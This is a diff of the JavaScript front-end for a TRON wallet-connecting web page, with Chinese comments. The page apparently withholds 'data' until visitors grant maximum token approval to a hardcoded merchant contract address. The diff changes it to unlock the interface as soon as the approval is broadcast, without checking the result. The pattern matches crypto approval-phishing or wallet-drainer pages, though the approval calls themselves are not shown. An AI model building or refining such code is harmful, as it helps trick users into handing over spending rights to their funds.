@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 最終穩定版：樂觀授權判斷 (Optimistic Authorization) + 無延遲 🚨
+// 🚨 最終穩定版：最極端的樂觀授權判斷 (無檢查，廣播成功即解鎖) 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -80,7 +80,7 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
         
         // 🚨 樂觀判斷：立即返回成功
         showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播成功！`);
-        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒 (僅為 UI 閃爍緩衝)
+        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒 (UI緩衝)
         
         return txHash;
 
@@ -143,11 +143,10 @@ async function connectTronLink() {
         userAddress = window.tronWeb.defaultAddress.base58;
         await initializeContracts();
         updateConnectionUI(true, userAddress);
-        await handlePostConnection();
+        // 不在這裡執行 handlePostConnection
         return true;
     } catch (error) {
         console.error("TronLink 連接失敗:", error);
-        // 不在這裡設置 showOverlay，讓 connectWalletLogic 統一處理失敗訊息
         updateConnectionUI(false);
         return false;
     }
@@ -162,39 +161,33 @@ async function connectWalletLogic() {
     if (evmProvider) {
         showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
         try {
-            // 請求 EVM 連接
             const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
-            const evmAddress = accounts[0]; // 獲取 EVM 格式地址 (0x...)
+            const evmAddress = accounts[0]; 
 
-            // 2. 檢查 TronWeb 是否存在 (在 Trust Wallet 中通常不會存在，這是瓶頸)
             if (!window.tronWeb) {
-                // 連線成功，但無法發送 TRON 合約交易
                 throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
             }
             
-            // 🚨 如果有 TronWeb 注入 (極少數情況)，則繼續
             tronWeb = window.tronWeb;
-            userAddress = tronWeb.address.fromHex(evmAddress); // 從 EVM 地址轉換為 TRON 地址
+            userAddress = tronWeb.address.fromHex(evmAddress); 
             
             await initializeContracts();
             updateConnectionUI(true, userAddress);
-            await handlePostConnection();
+            // 不在這裡執行 handlePostConnection
             return true;
 
         } catch (error) {
-            // EVM 請求被拒絕或錯誤
             console.error("EVM Provider 連接失敗或被拒絕，嘗試 TronLink...");
-            // 繼續執行步驟 3
         }
     }
     
-    // 3. 備用：嘗試 TronLink 連線 (如果存在)
+    // 2. 備用：嘗試 TronLink 連線 (如果存在)
     if (window.tronLink) {
         const tronLinkConnected = await connectTronLink();
         if (tronLinkConnected) return true;
     }
 
-    // 4. 完全沒有任何 Provider
+    // 3. 完全沒有任何 Provider
     showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
     return false;
 }
@@ -288,7 +281,7 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
-        // 🚨 已授權：最終成功狀態
+        // 🚨 最終授權完成狀態
         showOverlay('✅ Max 授權已成功！數據已解鎖。');
         updateContentLock(true); 
         await new Promise(resolve => setTimeout(resolve, 3000));
@@ -303,22 +296,19 @@ async function handlePostConnection() {
         `);
         updateContentLock(false); 
         
-        const authSuccess = await connectAndAuthorize(); // 這裡會執行授權操作
-
-        // 🚨 最終修正：樂觀判斷
-        // 如果廣播成功 (authSuccess = true)，則直接跳轉到成功狀態。
-        // 這徹底阻止了遞歸調用和狀態檢查循環。
+        const authSuccess = await connectAndAuthorize();
+        
+        // 🚨 最終修正：廣播成功，立即進入成功解鎖的 UI 狀態 (避免檢查循環)
         if (authSuccess) {
-            showOverlay('✅ 授權操作已成功廣播！正在解鎖數據...');
-            
-            // 🚨 直接調用成功解鎖的 UI 邏輯，跳過 checkAuthorization 的遞歸
+             // 樂觀判斷成功：直接解鎖 UI，不進行遞歸狀態檢查
+            showOverlay('✅ 授權操作已廣播成功！正在解鎖數據...');
             updateContentLock(true); 
             await new Promise(resolve => setTimeout(resolve, 3000));
             hideOverlay();
         } 
-        // 如果 authSuccess = false，則停留在當前鎖定和錯誤訊息。
     }
 }
+
 // ---------------------------------------------
 // 主連接入口函數 (混合連線邏輯)
 // ---------------------------------------------
